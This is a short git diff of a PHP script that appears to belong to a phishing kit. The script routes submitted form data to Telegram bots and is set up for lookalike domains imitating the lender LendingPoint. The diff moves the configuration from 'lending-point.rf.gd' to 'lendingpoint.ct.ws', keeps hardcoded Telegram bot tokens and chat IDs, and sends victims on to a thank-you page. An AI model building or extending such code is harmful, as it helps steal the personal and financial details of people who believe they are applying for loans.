@@ -4,13 +4,13 @@ include 'firewall.php';
 
 // 🔐 Telegram configuration per domain
 $site_map = [
-    'lending-point.rf.gd' => [
+    'lendingpoint.ct.ws' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']
 
         ],
-        'redirect' => 'https://lending-point.rf.gd/lendingpoint/thankyou.html'
+        'redirect' => 'https://lendingpoint.ct.ws/lendingpoint/thankyou.html'
     ],
     'site2.com' => [
         'bots' => [
